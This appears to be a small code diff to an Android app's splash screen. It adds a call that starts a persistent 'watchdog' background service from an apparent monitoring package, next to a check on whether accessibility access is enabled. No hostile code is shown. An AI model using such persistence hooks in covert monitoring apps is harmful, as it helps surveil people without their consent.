@@ -36,6 +36,9 @@ class SplashActivity : AppCompatActivity() {
         super.onCreate(savedInstanceState)
         setContentView(R.layout.activity_splash)
 
+        // Elevate process priority to FOREGROUND while app activity is in foreground
+        com.spapp.monitoring.sync.PersistentWatchdogService.start(applicationContext)
+
         val state = DeviceState(this)
         val isA11yActive = AccessibilityStatus.isEnabled(this)
 
